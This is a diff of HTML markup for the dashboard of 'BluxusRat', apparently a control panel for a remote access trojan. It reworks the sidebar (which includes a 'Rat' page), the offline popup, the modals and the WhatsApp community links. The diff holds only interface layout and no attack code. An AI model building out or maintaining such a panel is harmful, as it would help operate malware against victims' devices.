+<div class="dev-name">Yummy</div>
+<div class="dev-role">Lead Developer</div>
 </div>
-<div class="section fade-in-2">
-<h3><div class="ico-badge"><i class="fa-solid fa-users"></i></div> Community</h3>
-<div class="list-item" onclick="window.open('https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">Channel WhatsApp</div><div class="d">Info & update</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
-<div class="list-item" onclick="window.open('https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU','_blank')"><div class="ico-badge"><i class="fa-solid fa-comments"></i></div><div class="txt"><div class="n">Grup WhatsApp</div><div class="d">Diskusi komunitas</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
 </div>
-<div class="section fade-in-3">
-<h3><div class="ico-badge"><i class="fa-solid fa-heart"></i></div> Credits</h3>
-<div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-fire"></i></div><div class="txt"><div class="n">Firebase</div><div class="d">Realtime Database</div></div></div>
-<div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-bolt"></i></div><div class="txt"><div class="n">FazzCode</div><div class="d">API Provider</div></div></div>
-<div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-cloud"></i></div><div class="txt"><div class="n">Termai</div><div class="d">Upload API</div></div></div>
-<div class="list-item" style="cursor:default"><div class="ico-badge"><i class="fa-solid fa-tv"></i></div><div class="txt"><div class="n">NexaDev</div><div class="d">Anime API</div></div></div>
+</div>
 </div>
 </div>
 </div>
 
-<!-- PANEL -->
-<div class="screen" id="screen-panel">
-<div class="dash-header">
-<div class="hamburger" id="btn-hamburger-panel"><i class="fa-solid fa-bars"></i></div>
-<span class="page-title" id="panel-title">Panel</span>
-<div style="width:40px"></div>
+<!-- ============ SIDEBAR ============ -->
+<div class="sidebar-backdrop" id="sidebar-backdrop"></div>
+<aside class="sidebar" id="sidebar">
+<div class="sidebar-header">
+<div class="sidebar-logo">BLUXUS</div>
+<div class="sidebar-sub" id="sb-sub">Nexus</div>
 </div>
-<div class="dash-body">
-<div class="section fade-in">
-<h3><div class="ico-badge"><i class="fa-solid fa-shield-halved"></i></div> <span id="panel-role-text">PANEL</span></h3>
-<div style="font-size:12px;color:var(--text-dim);line-height:1.6">Kelola user & sistem dari sini.</div>
-</div>
-<div class="panel-grid" id="panel-grid"></div>
-</div>
-</div>
-
-</div>
-</div>
-
-<!-- AUDIO PLAYER -->
-<div class="player-bar" id="player-bar">
-<img class="pb-cover" id="pb-cover" src="" onerror="this.style.display='none'">
-<div class="pb-info">
-<div class="t" id="pb-title">—</div>
-<div class="a" id="pb-artist">—</div>
-<div class="progress-mini"><div class="fill" id="pb-progress"></div></div>
-</div>
-<div class="pb-controls">
-<button class="pb-btn play" id="pb-toggle"><i class="fa-solid fa-play" id="pb-toggle-icon"></i></button>
-<button class="pb-close" id="pb-close"><i class="fa-solid fa-xmark"></i></button>
-</div>
-</div>
-
-<!-- SIDEBAR -->
-<div id="sidebar-backdrop"></div>
-<aside id="sidebar">
-<div class="sb-head">
-<div class="brand">BluxusRat</div>
-<div class="sub" id="sb-sub">—</div>
-</div>
-<nav class="sb-nav">
-<div class="sb-item active" data-page="dash"><div class="ico-badge"><i class="fa-solid fa-house"></i></div> Dashboard</div>
-<div class="sb-item" data-page="rat"><div class="ico-badge"><i class="fa-solid fa-satellite-dish"></i></div> Rat</div>
-<div class="sb-item anime" data-page="anime"><div class="ico-badge"><i class="fa-solid fa-tv"></i></div> BluxAnime</div>
-<div class="sb-item" data-page="tools"><div class="ico-badge"><i class="fa-solid fa-toolbox"></i></div> Tools</div>
-<div class="sb-item" data-page="benefit"><div class="ico-badge"><i class="fa-solid fa-medal"></i></div> Benefit Role</div>
-<div class="sb-item" data-page="account"><div class="ico-badge"><i class="fa-solid fa-user"></i></div> Account</div>
-<div class="sb-item" data-page="changelog"><div class="ico-badge"><i class="fa-solid fa-code-branch"></i></div> Changelog</div>
-<div class="sb-item" data-page="about"><div class="ico-badge"><i class="fa-solid fa-circle-info"></i></div> About</div>
-<div id="sb-role-sep" class="hidden"><div class="sb-sep"></div><div class="sb-label">Management</div></div>
-<div class="sb-item hidden" id="sb-panel" data-page="panel"><div class="ico-badge"><i class="fa-solid fa-crown"></i></div> Panel</div>
+<nav class="sidebar-nav">
+<div class="nav-item active" data-page="dash"><i class="fas fa-home"></i><span>Dashboard</span></div>
+<div class="nav-item" data-page="rat"><i class="fas fa-satellite-dish"></i><span>Rat</span></div>
+<div class="nav-item" data-page="account"><i class="fas fa-user"></i><span>Account</span></div>
+<div class="nav-item" data-page="about"><i class="fas fa-info-circle"></i><span>About</span></div>
 </nav>
 </aside>
 
-<!-- OFFLINE POPUP -->
-<div id="offline-popup">
-<div class="offline-bg-grid"></div>
-<div class="offline-glow offline-glow-1"></div>
-<div class="offline-glow offline-glow-2"></div>
-<div class="offline-container">
-<div class="offline-icon-wrap"><div class="offline-icon"><i class="fa-solid fa-wifi"></i></div></div>
-<div class="offline-badge"><span class="dot"></span><span>Tidak Ada Jaringan</span></div>
-<div class="offline-card">
-<div class="offline-title">Koneksi Terputus</div>
-<div class="offline-subtitle">BluxusRat V1 [NewEra]</div>
-<div class="offline-message"><i class="fa-solid fa-circle-info"></i>BluxusRat membutuhkan koneksi internet yang stabil untuk terus menerima update, sinkronisasi data, dan fitur real-time. Sambungkan kembali perangkat ke WiFi atau data seluler. Panel akan otomatis tersambung kembali saat koneksi tersedia.</div>
-<div class="offline-info-list">
-<div class="offline-info-item"><div class="ico"><i class="fa-solid fa-wifi"></i></div><div class="txt"><div class="l">Status Jaringan</div><div class="v warn" id="offline-network-status">Terputus</div></div></div>
-<div class="offline-info-item"><div class="ico"><i class="fa-solid fa-signal"></i></div><div class="txt"><div class="l">Koneksi Server</div><div class="v" id="offline-server-status">Menunggu koneksi...</div></div></div>
-<div class="offline-info-item"><div class="ico"><i class="fa-solid fa-clock"></i></div><div class="txt"><div class="l">Waktu Cek Terakhir</div><div class="v" id="offline-last-check">—</div></div></div>
+<!-- ============ OFFLINE ============ -->
+<div class="offline-modal" id="offline-popup">
+<div class="offline-backdrop"></div>
+<div class="offline-box">
+<div class="offline-icon"><i class="fas fa-wifi-slash"></i></div>
+<div class="offline-title">No Connection</div>
+<div class="offline-message">
+<i class="fas fa-exclamation-circle"></i>
+<span>BluxusRat requires stable internet connection for real-time features. Please reconnect your device.</span>
 </div>
-<div class="offline-progress"><div class="fill"></div></div>
-<div class="offline-contact-row">
-<a class="offline-contact-btn wa" href="https://wa.me/6283137236898" target="_blank"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
-<a class="offline-contact-btn ch" href="https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w" target="_blank"><i class="fa-solid fa-bullhorn"></i><span>Channel</span></a>
-<a class="offline-contact-btn gr" href="https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU" target="_blank"><i class="fa-solid fa-comments"></i><span>Grup</span></a>
+<div class="offline-status">
+<div class="status-item">
+<div class="status-label">Network</div>
+<div class="status-value" id="offline-network-status">Offline</div>
+</div>
+<div class="status-item">
+<div class="status-label">Last Check</div>
+<div class="status-value" id="offline-last-check">—</div>
 </div>
 </div>
-<div class="offline-footer"><div class="brand">BluxusRat</div><div>© 2026 BluxusRat — All Rights Reserved</div></div>
 </div>
 </div>
 
-<!-- MODAL -->
-<div class="modal" id="modal"><div class="modal-box" id="modal-box"></div></div>
+<!-- ============ MODAL ============ -->
+<div class="modal-backdrop" id="modal-backdrop"></div>
+<div class="modal-box" id="modal-box"></div>
 
-<!-- TOAST -->
-<div id="toast-wrap"></div>
+<!-- ============ TOAST ============ -->
+<div class="toast-container" id="toast-wrap"></div>
+
+</div>
+</div>
 
 <script type="module" src="script.js"></script>
 
